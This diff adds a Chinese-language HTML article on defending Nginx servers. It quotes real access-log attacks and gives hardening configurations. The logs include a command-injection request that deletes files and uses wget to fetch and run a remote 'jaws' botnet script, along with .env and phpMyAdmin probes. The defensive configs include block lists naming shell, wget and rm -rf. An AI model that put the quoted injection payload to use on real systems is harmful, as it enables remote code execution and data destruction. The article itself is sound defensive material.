@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>保护 Nginx 免受恶意探测：分析与防护措施</title>
+    <style>
+        body {
+            font-family: Arial, 'PingFang SC', sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #fff;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1, h2, h3 {
+            color: #2c3e50;
+        }
+        pre {
+            background: #f8f8f8;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        code {
+            font-family: Consolas, monospace;
+            font-size: 14px;
+        }
+        ul {
+            margin: 10px 0;
+            padding-left: 20px;
+        }
+        a {
+            color: #3498db;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>保护 Nginx 免受恶意探测：分析与防护措施</h1>
+      
+        <p>运行 Nginx 的 Web 服务器经常成为恶意活动的攻击目标，包括漏洞扫描、命令注入尝试以及敏感文件访问探测。本文分析了 Nginx 访问日志中显示的真实攻击案例，并提供了使用 Nginx 配置、服务器加固和监控技术来保护服务器的实用步骤。</p>
+
+        <h2>了解恶意探测</h2>
+        <p>以下 Nginx 访问日志揭示了针对 Web 服务器的多种攻击模式。以下是对观察到的主要威胁的分析：</p>
+
+        <h3>1. 命令注入尝试</h3>
+        <pre><code>8.133.255.12 - - [19/Jul/2025:11:32:57 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1" 400 150 "-" "-"</code></pre>
+        <p><strong>描述</strong>：此请求试图通过命令注入漏洞下载并执行来自远程服务器的恶意脚本（<code>jaws</code>），并可能通过 <code>rm -rf *</code> 删除文件。</p>
+        <p><strong>威胁</strong>：远程代码执行（RCE）、数据破坏或恶意软件安装（例如 DDoS 僵尸网络）。</p>
+
+        <h3>2. phpMyAdmin 和管理界面探测</h3>
+        <pre><code>47.243.137.229 - - [19/Jul/2025:11:38:53 +0000] "GET http://137.175.127.130:80/phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0" 444 0 "-" "-"
+47.243.137.229 - - [19/Jul/2025:11:38:54 +0000] "GET http://137.175.127.130:80/MyAdmin/scripts/setup.php HTTP/1.0" 444 0 "-" "-"</code></pre>
+        <p><strong>描述</strong>：多个请求针对过时的 phpMyAdmin 和数据库管理界面，试图利用旧版本中的已知漏洞。</p>
+        <p><strong>威胁</strong>：未经授权的数据库访问、数据窃取或服务器被攻破。</p>
+
+        <h3>3. 敏感文件访问尝试</h3>
+        <pre><code>149.22.87.110 - - [19/Jul/2025:12:06:47 +0000] "GET /.env HTTP/1.1" 444 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
+unix: - - [19/Jul/2025:12:30:20 +0000] "GET /.env HTTP/1.1" 400 248 "-" "Opera/9.80 (Linux mips; ) Presto/2.12.407 Version/12.51 MB97/0.0.39.18 (HITACHI, Mxl661L32, wireless) VSTVB_MB97  SmartTvA/3.0.0"</code></pre>
+        <p><strong>描述</strong>：攻击者试图访问 <code>.env</code> 文件及其变体（例如 <code>.env-ssl.log</code>、<code>.env.mongodb</code>），以窃取 API 密钥或数据库凭据等敏感信息。</p>
+        <p><strong>威胁</strong>：凭据窃取或未经授权的资源访问。</p>
+
+        <h3>4. 漏洞扫描和侦察</h3>
+        <pre><code>unix: - - [19/Jul/2025:11:46:57 +0000] "GET /ab2g HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"
+unix: - - [19/Jul/2025:11:46:57 +0000] "GET /ab2h HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"</code></pre>
+        <p><strong>描述</strong>：带有 <code>zgrab/0.x</code> 用户代理的请求表明使用 ZGrab 等工具进行自动化扫描，以识别服务器指纹或漏洞。</p>
+        <p><strong>威胁</strong>：服务器指纹识别，可能导致针对性攻击。</p>
+
+        <h3>5. 代理滥用尝试</h3>
+        <pre><code>unix: - - [19/Jul/2025:12:19:44 +0000] "CONNECT pro.ip-api.com:443 HTTP/1.1" 400 63 "-" "-"</code></pre>
+        <p><strong>描述</strong>：<code>CONNECT</code> 方法试图将服务器用作代理以访问外部服务。</p>
+        <p><strong>威胁</strong>：服务器被滥用为开放代理，可能导致黑名单或资源耗尽。</p>
+
+        <h3>6. SSH 探测</h3>
+        <pre><code>unix: - - [19/Jul/2025:11:46:08 +0000] "SSH-2.0-Go" 400 63 "-" "-"</code></pre>
+        <p><strong>描述</strong>：此请求表明攻击者在 HTTP 端口上尝试 SSH 连接，可能是扫描开放的 SSH 服务。</p>
+        <p><strong>威胁</strong>：如果 SSH 服务暴露，可能导致暴力破解或其他攻击。</p>
+
+        <h2>防护措施</h2>
+        <p>以下是保护 Nginx 服务器免受上述攻击的实用步骤，包括 Nginx 配置、服务器加固和监控措施。</p>
+
+        <h3>1. 阻止恶意 IP 和实施速率限制</h3>
+        <p><strong>措施</strong>：阻止已知的恶意 IP 地址，并使用速率限制来缓解暴力扫描。</p>
+        <pre><code>geo $block_ip {
+    default 0;
+    8.133.255.12 1;
+    47.243.137.229 1;
+    # 添加其他恶意 IP
+}
+
+server {
+    if ($block_ip) {
+        return 403;
+    }
+}
+
+limit_req_zone $binary_remote_addr zone=strictlimit:10m rate=5r/s;
+
+server {
+    limit_req zone=strictlimit burst=10 nodelay;
+    limit_req_status 429;
+}
+</code></pre>
+        <p><strong>说明</strong>：<code>geo</code> 指令阻止特定 IP，速率限制防止单一 IP 的高频请求。</p>
+
+        <h3>2. 过滤恶意 URL 和查询字符串</h3>
+        <p><strong>措施</strong>：阻止包含危险模式（如 <code>shell</code>、<code>wget</code>、<code>.env</code>）的请求。</p>
+        <pre><code>server {
+    # 阻止恶意查询字符串
+    if ($args ~* "(shell|wget|rm+-rf|\.env|phpMyAdmin|setup\.php)") {
+        return 403;
+    }
+
+    # 阻止特定路径
+    location ~* ^/(phpMyAdmin|mysql|webadmin|pma|sql|myadmin|dbadmin|phpma|sqlmanager|MyAdmin|PHPMYADMIN)/ {
+        return 403;
+    }
+
+    # 阻止 .env 文件
+    location ~* \.(env|env-.*|secrets|key\.pem|ini\.bak|yml|log)$ {
+        deny all;
+        return 403;
+    }
+}
+</code></pre>
+        <p><strong>说明</strong>：阻止常见管理面板路径和敏感文件，防止漏洞利用和信息泄露。</p>
+
+        <h3>3. 限制 HTTP 方法</h3>
+        <p><strong>措施</strong>：仅允许必要的 HTTP 方法（如 <code>GET</code>、<code>POST</code>）。</p>
+        <pre><code>server {
+    if ($request_method !~ ^(GET|POST|HEAD)$) {
+        return 405;
+    }
+}
+</code></pre>
+        <p><strong>说明</strong>：限制不安全的 HTTP 方法，防止潜在的漏洞利用。</p>
+
+        <h3>4. 阻止代理滥用</h3>
+        <p><strong>措施</strong>：阻止 <code>CONNECT</code> 方法以防止服务器被用作代理。</p>
+        <pre><code>server {
+    if ($request_method = CONNECT) {
+        return 403;
+    }
+}
+</code></pre>
+        <p><strong>说明</strong>：此配置防止服务器被滥用为代理。</p>
+
+        <h3>5. 阻止恶意用户代理</h3>
+        <p><strong>措施</strong>：阻止已知的恶意用户代理（如 <code>zgrab/0.x</code>）或空用户代理。</p>
+        <pre><code>server {
+    if ($http_user_agent ~* "(zgrab|scanner|bot)") {
+        return 403;
+    }
+    if ($http_user_agent = "") {
+        return 403;
+    }
+}
+</code></pre>
+        <p><strong>说明</strong>：阻止自动化扫描工具和空用户代理请求，减少侦察行为。</p>
+
+        <h3>6. 保护 SSH 服务</h3>
+        <p><strong>措施</strong>：确保 SSH 不暴露在 HTTP 端口上，并加固 SSH 配置。</p>
+        <pre><code># /etc/ssh/sshd_config
+Port 2222
+PermitRootLogin no
+PasswordAuthentication no
+AllowUsers your_username
+</code></pre>
+        <p><strong>说明</strong>：使用非标准端口、禁用 root 登录和密码认证，限制 SSH 访问。</p>
+        <p><strong>命令</strong>：重启 SSH 服务：</p>
+        <pre><code>sudo systemctl reload sshd</code></pre>
+
+        <h3>7. 实施 Web 应用防火墙（WAF）</h3>
+        <p><strong>措施</strong>：部署 ModSecurity 或云端 WAF（如 Cloudflare）以动态过滤恶意请求。</p>
+        <pre><code>sudo apt install libmodsecurity3 modsecurity-crs
+</code></pre>
+        <p><strong>说明</strong>：ModSecurity 使用 OWASP 核心规则集来检测和阻止常见攻击模式。</p>
+
+        <h3>8. 增强日志记录和监控</h3>
+        <p><strong>措施</strong>：启用详细日志并使用 <code>fail2ban</code> 自动阻止恶意 IP。</p>
+        <pre><code>log_format detailed '$remote_addr - $remote_user [$time_local] '
+                   '"$request" $status $body_bytes_sent '
+                   '"$http_referer" "$http_user_agent" "$request_uri"';
+
+access_log /var/log/nginx/access.log detailed;
+</code></pre>
+        <p><strong>fail2ban 配置</strong>（<code>/etc/fail2ban/filter.d/nginx-malicious.conf</code>）：</p>
+        <pre><code>[Definition]
+failregex = ^<HOST> - .* "(GET|POST|CONNECT) /(ab2g|ab2h|download/powershell|\.env.*) HTTP.*" 400
+            ^<HOST> - .* "SSH-2.0-Go" 400
+            ^<HOST> - .* "CONNECT .* HTTP.*" 400
+ignoreregex =
+</code></pre>
+        <p><strong>说明</strong>：自动阻止重复恶意请求的 IP，增强服务器安全性。</p>
+
+        <h3>9. 使用 HTTPS 和安全标头</h3>
+        <p><strong>措施</strong>：强制使用 HTTPS 并添加安全标头以防止客户端漏洞。</p>
+        <pre><code>server {
+    listen 80;
+    return 301 https://$host$request_uri;
+}
+
+server {
+    listen 443 ssl;
+    ssl_certificate /path/to/cert.pem;
+    ssl_certificate_key /path/to/key.pem;
+
+    add_header X-Frame-Options "DENY";
+    add_header X-Content-Type-Options "nosniff";
+    add_header X-XSS-Protection "1; mode=block";
+    add_header Content-Security-Policy "default-src 'self'";
+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";
+}
+</code></pre>
+        <p><strong>说明</strong>：HTTPS 加密流量，安全标头防止 XSS 和点击劫持等攻击。</p>
+
+
+        <h2>立即采取行动</h2>
+        <ul>
+          
+            <li><strong>应用 Nginx 配置</strong>：
+                <pre><code>sudo nginx -t && sudo systemctl reload nginx</code></pre>
+            </li>
+        </ul>
+
+        <h2>总结</h2>
+        <p>这些日志显示了持续的侦察、漏洞扫描、敏感文件访问和代理滥用尝试。通过实施严格的 Nginx 配置、阻止恶意 IP 和用户代理、保护 SSH 以及增强监控，您可以有效缓解这些威胁。定期审计服务器和日志，保持系统更新，并考虑使用 WAF 或 CDN（如 Cloudflare）以进一步提高安全性。如果需要针对特定服务器配置的帮助，请提供更多细节！</p>
+
+        <p><a href="https://nginx.org" target="_blank">了解更多关于 Nginx 的信息</a></p>
+    </div>
+</body>
+</html>
